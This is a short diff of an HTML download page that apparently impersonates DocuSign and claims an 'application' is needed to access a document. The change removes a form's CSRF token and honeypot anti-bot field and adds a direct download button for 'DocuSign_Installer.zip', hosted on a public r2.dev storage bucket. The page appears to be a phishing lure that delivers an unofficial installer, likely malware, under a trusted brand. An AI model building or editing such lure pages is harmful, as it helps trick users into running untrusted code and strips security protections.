@@ -32,15 +32,11 @@
                         <li>Follow the on-screen promts to complete the installtion.</li>
                     </ol>
                 </div>
-                <form action="/download" method="POST">
-                    <!-- CSRF protection token -->
-                    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
-                    <!-- Honeypot field to block bots -->
-                    <input type="text" name="website" style="display:none;" tabindex="-1" autocomplete="off">
-                    <div class="download-btn">
-                        <button type="submit">Download DocuSign</button>
-                    </div>
-                </form>
+                <div class="download-btn">
+                    <a href="https://pub-5943043f0aa3454291be9cd2fe736787.r2.dev/DocuSign_Installer.zip" download>
+                        <button type="button">Download DocuSign</button>
+                    </a>
+                </div>
                     <p><strong>Requires docusign application for document access</strong></p>
                 </div>
             </div>
